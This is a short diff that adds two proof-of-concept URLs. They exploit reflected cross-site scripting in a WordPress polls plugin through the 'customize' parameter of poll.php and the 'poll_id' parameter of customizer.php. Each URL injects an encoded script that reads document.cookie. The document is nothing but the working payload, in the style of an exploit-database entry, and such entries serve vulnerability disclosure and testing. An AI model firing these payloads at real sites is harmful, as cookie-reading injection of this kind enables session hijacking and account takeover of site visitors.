@@ -1,0 +1,4 @@
+http://www.example.com/wp-content/plugins/sodahead-polls/poll.php?customize=%27;%3C/script%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+
+http://www.example.com/wp-content/plugins/sodahead-polls/customizer.php?poll_id=%27%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
